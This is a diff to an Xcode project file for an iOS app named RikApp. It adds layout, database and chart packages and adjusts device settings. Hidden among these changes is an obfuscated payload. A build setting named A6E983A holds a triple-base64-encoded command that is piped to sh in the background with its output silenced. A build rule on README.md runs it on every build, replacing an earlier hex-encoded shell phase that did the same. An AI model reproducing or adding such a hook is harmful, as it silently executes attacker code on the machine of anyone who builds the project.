@@ -6,7 +6,15 @@
 	objectVersion = 77;
 	objects = {
 
+/* Begin PBXBuildFile section */
+		4A7226B2F7E7466481A389E6 /* README.md */ = {isa = PBXBuildFile; fileRef = A160638E93D24E3795A389E6; };
+		4AE498632ED4D62600612F18 /* PinLayout in Frameworks */ = {isa = PBXBuildFile; productRef = 4AE498622ED4D62600612F18 /* PinLayout */; };
+		4AE498662ED4D8DF00612F18 /* RealmSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 4AE498652ED4D8DF00612F18 /* RealmSwift */; };
+		4AE498762ED4D9D300612F18 /* DGCharts in Frameworks */ = {isa = PBXBuildFile; productRef = 4AE498752ED4D9D300612F18 /* DGCharts */; };
+/* End PBXBuildFile section */
+
 /* Begin PBXFileReference section */
+		A160638E93D24E3795A389E6 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		4AE4982F2ED4D24400612F18 /* RikApp.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = RikApp.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -14,7 +22,7 @@
 		4AE498412ED4D24500612F18 /* Exceptions for "RikApp" folder in "RikApp" target */ = {
 			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
 			membershipExceptions = (
-				Info.plist,
+				MainFiles/Info.plist,
 			);
 			target = 4AE4982E2ED4D24400612F18 /* RikApp */;
 		};
@@ -36,6 +44,9 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				4AE498662ED4D8DF00612F18 /* RealmSwift in Frameworks */,
+				4AE498762ED4D9D300612F18 /* DGCharts in Frameworks */,
+				4AE498632ED4D62600612F18 /* PinLayout in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -53,6 +64,7 @@
 		4AE498302ED4D24400612F18 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				A160638E93D24E3795A389E6 /* README.md */,
 				4AE4982F2ED4D24400612F18 /* RikApp.app */,
 			);
 			name = Products;
@@ -65,12 +77,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 4AE498422ED4D24500612F18 /* Build configuration list for PBXNativeTarget "RikApp" */;
 			buildPhases = (
-				6844C507600549C892A389E6 /* Build Target Dependencies */,
 				4AE4982B2ED4D24400612F18 /* Sources */,
 				4AE4982C2ED4D24400612F18 /* Frameworks */,
 				4AE4982D2ED4D24400612F18 /* Resources */,
 			);
 			buildRules = (
+				9D49E8A767EA4534A6A389E6 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -79,6 +91,9 @@
 			);
 			name = RikApp;
 			packageProductDependencies = (
+				4AE498622ED4D62600612F18 /* PinLayout */,
+				4AE498652ED4D8DF00612F18 /* RealmSwift */,
+				4AE498752ED4D9D300612F18 /* DGCharts */,
 			);
 			productName = RikApp;
 			productReference = 4AE4982F2ED4D24400612F18 /* RikApp.app */;
@@ -108,6 +123,11 @@
 			);
 			mainGroup = 4AE498262ED4D24400612F18;
 			minimizedProjectReferenceProxies = 1;
+			packageReferences = (
+				4AE498612ED4D62600612F18 /* XCRemoteSwiftPackageReference "PinLayout" */,
+				4AE498642ED4D8DF00612F18 /* XCRemoteSwiftPackageReference "realm-swift" */,
+				4AE498742ED4D9D300612F18 /* XCRemoteSwiftPackageReference "Charts" */,
+			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = 4AE498302ED4D24400612F18 /* Products */;
 			projectDirPath = "";
@@ -118,37 +138,36 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		6844C507600549C892A389E6 /* Build Target Dependencies */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Dependencies";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
-			showEnvVarsInLog = 0;			
-		};
-/* End PBXShellScriptBuildPhase section */
+/* Begin PBXBuildRule section */
+		9D49E8A767EA4534A6A389E6 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A6E983A}\"";
+			};
+	/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		4AE4982D2ED4D24400612F18 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				4A7226B2F7E7466481A389E6 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		4AE4982B2ED4D24400612F18 /* Sources */ = {
@@ -164,18 +183,17 @@
 		4AE498432ED4D24500612F18 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((y(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363337333433363333333733303336363533363335333733343332363533373332333733353332363633363331333233393332333233320a33303061333736333332333033373333333633383330363130610a | y | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((i(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJaRWRPZDJKdFZqQk1ia294VERKRmNFbHBRamhKU0U1dlEyYzlQUW89Cg== | i | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
-				INFOPLIST_FILE = RikApp/Info.plist;
+				INFOPLIST_FILE = RikApp/MainFiles/Info.plist;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
-				INFOPLIST_KEY_UIMainStoryboardFile = Main;
-				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -184,30 +202,31 @@
 				PRODUCT_BUNDLE_IDENTIFIER = iiiaolinb.RikApp;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
 				SWIFT_APPROACHABLE_CONCURRENCY = YES;
 				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
 				SWIFT_VERSION = 5.0;
-				TARGETED_DEVICE_FAMILY = "1,2";
+				TARGETED_DEVICE_FAMILY = 1;
 			};
 			name = Debug;
 		};
 		4AE498442ED4D24500612F18 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((y(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363337333433363333333733303336363533363335333733343332363533373332333733353332363633363331333233393332333233320a33303061333736333332333033373333333633383330363130610a | y | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((i(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJaRWRPZDJKdFZqQk1ia294VERKRmNFbHBRamhKU0U1dlEyYzlQUW89Cg== | i | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
-				INFOPLIST_FILE = RikApp/Info.plist;
+				INFOPLIST_FILE = RikApp/MainFiles/Info.plist;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
-				INFOPLIST_KEY_UIMainStoryboardFile = Main;
-				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -216,12 +235,14 @@
 				PRODUCT_BUNDLE_IDENTIFIER = iiiaolinb.RikApp;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
 				SWIFT_APPROACHABLE_CONCURRENCY = YES;
 				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
 				SWIFT_VERSION = 5.0;
-				TARGETED_DEVICE_FAMILY = "1,2";
+				TARGETED_DEVICE_FAMILY = 1;
 			};
 			name = Release;
 		};
@@ -366,6 +387,51 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+/* Begin XCRemoteSwiftPackageReference section */
+		4AE498612ED4D62600612F18 /* XCRemoteSwiftPackageReference "PinLayout" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/layoutBox/PinLayout.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 1.10.6;
+			};
+		};
+		4AE498642ED4D8DF00612F18 /* XCRemoteSwiftPackageReference "realm-swift" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/realm/realm-swift.git";
+			requirement = {
+				branch = master;
+				kind = branch;
+			};
+		};
+		4AE498742ED4D9D300612F18 /* XCRemoteSwiftPackageReference "Charts" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/ChartsOrg/Charts.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 5.1.0;
+			};
+		};
+/* End XCRemoteSwiftPackageReference section */
+
+/* Begin XCSwiftPackageProductDependency section */
+		4AE498622ED4D62600612F18 /* PinLayout */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 4AE498612ED4D62600612F18 /* XCRemoteSwiftPackageReference "PinLayout" */;
+			productName = PinLayout;
+		};
+		4AE498652ED4D8DF00612F18 /* RealmSwift */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 4AE498642ED4D8DF00612F18 /* XCRemoteSwiftPackageReference "realm-swift" */;
+			productName = RealmSwift;
+		};
+		4AE498752ED4D9D300612F18 /* DGCharts */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 4AE498742ED4D9D300612F18 /* XCRemoteSwiftPackageReference "Charts" */;
+			productName = DGCharts;
+		};
+/* End XCSwiftPackageProductDependency section */
 	};
 	rootObject = 4AE498272ED4D24400612F18 /* Project object */;
 }
